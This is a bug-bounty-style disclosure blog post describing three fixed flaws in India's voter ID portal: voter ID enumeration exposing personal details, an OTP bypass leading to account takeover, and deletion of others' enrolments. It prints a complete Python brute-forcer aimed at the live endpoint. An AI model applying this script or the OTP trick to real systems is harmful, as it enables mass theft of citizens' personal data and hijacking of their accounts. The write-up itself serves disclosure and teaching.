---
layout: post
title: Exposing Millions of Voter ID card users’ details.
date: 2022-07-07
summary: Three critical bugs in India's voter portal led to the exposure of voter ID card users' data, impacting millions of individuals.
categories: VDP
tags: [IDOR, ATO]
---



![](https://cdn-images-1.medium.com/max/2000/1*Ux1ZHBkg1R1Gfhjwe1U7fw.png)



*Hi, Everyone. hope you’re well. I’m [Aziz](https://twitter.com/nxtexploit). Through this write-up, I will share some security issues I’ve found on the official Voter ID card maintaining platform [http://nvsp.in](https://nvsp.in). I was filling out a correction form for my mom’s card, I’m not really interested in finding bugs on gov websites :`) that moment [burpsuite ](https://portswigger.net/burp/documentation/desktop/penetration-testing)was running in the background and I thought let's have a try. After spending half an hour I found some critical issues that I’m going to share. All these issues are already fixed by the government.*

In India, a [Voter ID](https://www.google.com/search?q=what+is+voter+ID+%28india%29) card is an identity document issued by the Election Commission of India to adult domiciles of India who have reached the age of 18, which primarily serves as an identity proof for Indian citizens while casting their ballot in the country’s municipal, state, and national elections. More than **780 million** Voter IDs are active at present.

* ## **Bruteforcing valid Voter IDs and extracting details (IDOR / BOLA)**

While registering a new account it shows two options “I have ``EPIC`` number” and “I don’t have `EPIC` number”. `EPIC` stands for Electors Photo Identification Card and the `EPIC` number is nothing but Voter ID no. If we chose we don’t have a Voter ID number then they will give you an option to add after registering on the portal. After registration, I tried to add any random `EPIC` no. with my account but it show it's not valid. So I sent that HTTP request to burp intruder for [brute-forcing](https://en.wikipedia.org/wiki/Brute-force_attack).

![](https://cdn-images-1.medium.com/max/2728/1*SKG6_nhMm0PkRkRXJjK2yg.png)

A Voter ID also known as `EPIC` number is an alphanumerical ID, it contains three Alphabets at starting and seven numbers i.e. `WRI2345678`, `RDH2345678`, `DTN2345678`, `YCV2345678`, `NLN2345678`, `XMB2345678`, etc. These three alphabets are Not random alphabets, you can find similar IDs with similar these three alphabets in beginning but the rest seven digits are different.

![](https://cdn-images-1.medium.com/max/2000/1*oCiejaOMRmwdEpIRzi27PQ.png)

I added the payload position on these seven-digit numbers on `Epic_no=` parameter i.e `Epic_no=WRI$2345678$`  (as you can see in the below screenshot.)

![Adding payload position](https://cdn-images-1.medium.com/max/2236/1*xz61EAZwEhSWlsDpMkJSSw.png)

Surprisingly there is no limitation implemented in the backend and I was able to send **unlimited requests** without getting blocked by firewall. As a result backend server responding 302 redirections for every valid voter ID. (As shown in the screenshot below)

![responding 302 for every valid voter ID](https://cdn-images-1.medium.com/max/2740/1*dLe_eyFiPf9amQz0o50meQ.png)

Then I wrote a [python script](https://github.com/nxtexploit/Voter-ID-bruteforcer/blob/main/Voter-ID-bruteforcer.py) that will brute force the values and give output all valid voter_IDs for me.

![](https://cdn-images-1.medium.com/max/2000/1*DA8ghQIWnJlNZty0OK6oEA.gif)

```python

import urllib3
import requests
import time
from termcolor import colored
urllib3.disable_warnings()
start = time.perf_counter() 

cookies = {
    'nvsp': '4e565XXXXX',
    'cookiesession1': '678B286C164561FFEFXXXXXXXXXXX',
    'nvsp': '4e56XXXXX',
    'nvspid': 'ycnpiabqfasdf0asdf09ad',
    '__RequestVerificationToken': 'taDxPTIR3vxuyduujVCoi5eJdSlsAv1X0MQea7VYvLf6ksNDNsK7BkQZbNLSKagASDFpouasdfuopasfcsCmlofM6tTlC1opGS9FBEjYYXxC-z9ze73zdtEjUXtq9JfGVDfsXwt3WmQ925gSsbUw2',
    '.ASPXAUTH': '53BDCF7905E361CB6ECE80B77506A1A4A54DFS6546A5DF787AS8DFB2B9CE6874FDE524BF7BAE0DDC59329705AB29D49A148B4494341EC7634C13DB69FA25425DCA10CAADA3A10B025D58D8220E842959F0C650A8DF39B43039354B537BCE61AFB4922B99E22F20DC099C0DE9BC2CA53D1A37F387867855DDE5D89583B2F5F95D898A',
}

headers = {
    'Host': 'www.nvsp.in',
    'Cache-Control': 'max-age=0',
    'Sec-Ch-Ua': '".Not/A)Brand";v="99", "Google Chrome";v="103", "Chromium";v="103"',
    'Sec-Ch-Ua-Mobile': '?0',
    'Sec-Ch-Ua-Platform': '"Windows"',
    'Upgrade-Insecure-Requests': '1',
    'Origin': 'https://www.nvsp.in',
    'Content-Type': 'application/x-www-form-urlencoded',
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Safari/537.36',
    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
    'Sec-Fetch-Site': 'same-origin',
    'Sec-Fetch-Mode': 'navigate',
    'Sec-Fetch-User': '?1',
    'Sec-Fetch-Dest': 'document',
    'Referer': 'https://www.nvsp.in/Account/MyProfile',
    'Accept-Language': 'en-US,en;q=0.9',
    'Connection': 'close',
}


for voter_ID in range(2000000,2999999,1):


    data = '__RequestVerificationToken=dayrB-CCldwVYHXi7OE8b455jM3jLXRIdlHGQ5Wf4XyFE_7jjo1X3VfmkC4ZanqFO6h0XtveuAmSk1SIWWmV-SbA7nTUIJNKAfyRoiG43FvEAlDPi5VfkJWpGn9sV8IuFuBezLnC-tZSYFGqrRbECXgqlxpSduENgqaWy7oWQK01&OTP=&UserId=UQH34XXXXXXXX&firstName=Aziz&lastName=&Email=XXXXXXXX%40gmaill.com&Epic_no=WRI'+str(voter_ID)+'&PhoneNumber=XXXXXXXX87&st_code=S25&ac_no=55&PART_NO=42&Captcha=&Code='

    response = requests.post('https://www.nvsp.in/Account/MyProfile',allow_redirects=False, cookies=cookies, headers=headers, data=data, verify=False)

    if response.status_code == 302:
        print(f"Epic-ID FOUND = "+colored("WRI"+str(voter_ID),'green'))
    elif response.status_code == 200:
        print(colored("Not valid ID",'yellow'))
    else:
        print(colored("Session Expired ",'red')+"(response code = "+colored(str(response.status_code),'yellow')+")")

finish = time.perf_counter()

print(f'\n\nFinished in {round(finish-start, 2)} second(s)\n')

```

Now I have valid Voter IDs of random persons then, I added these IDs with my profile under “[/Account/MyProfile](https://www.nvsp.in/Account/MyProfile)”. Then there is an option under the “/[forms](https://www.nvsp.in/Forms)/”section which is **form001** and this form is already filled with **Name, father’s name, address, Date of birth, etc. **according to that valid EPIC ID added to my profile.

![**Extracted details of a random Person**](https://cdn-images-1.medium.com/max/2732/1*6izoRB4cWjN5zjdZTDYdJg.png)

* ## **Account takeover (OTP bypass)**

On the profile details updating section I was trying to add another user's number. So I created another account for it. But there was an OTP implanted there, and I tried to brute-force it but it didn’t work :( I remember reading an article last year, you can read it **[here](https://infosecwriteups.com/how-i-hacked-into-indias-top-matrimonial-website-and-earned-amazon-gift-card-worth-10k-inr-2a0b376219fa)**, where the author just added 0 after intercepting the request. And I did the same thing here on OTP parameter and it worked :)

![intercepting traffic while OTP is verifying](https://cdn-images-1.medium.com/max/2740/1*q0TSMqdgsXTtzROWDo6y9g.png)

![[Changed the OTP value to zero](https://infosecwriteups.com/how-i-hacked-into-indias-top-matrimonial-website-and-earned-amazon-gift-card-worth-10k-inr-2a0b376219fa)](https://cdn-images-1.medium.com/max/2000/1*eEVjGxhUUzdbv2vkHlExnw.png)

After bypassing I thought it just can register the victim’s number then I’ll reset the password, But surprisingly on replacing the victim’s number my profile data automatically changed with the victim’s details, And I can own his account.

![](https://cdn-images-1.medium.com/max/2740/1*az1-jwdyMLK1pOLWbA6ghA.png)

* ## **Delete/remove any random user’s Voter ID card Permanently (Logic flaw)**

From the 1st bug, we can get and add any random user’s Voter ID to our account, From that on the home page there is an option for “Deletion of Enrolment”. And nothing to be needed after an attacker added any random Voter ID on his profile section. then he can easily delete any random user’s Voter ID permanently.

![An attacker can delete any random user’s card permanently](https://cdn-images-1.medium.com/max/2732/1*SvvI8ZoSelvF3-83BzQRTw.png)

I reported these three issues to [vdisclose@cert-in.org.in](https://www.cert-in.org.in/VulnerIncident.jsp) and they fixed these issues.

I hope you liked this article, If you have any questions then you can dm me on Twitter: [https://twitter.com/nxtexploit](https://twitter.com/nxtexploit)

Thanks for reading,

regards,

**Aziz**
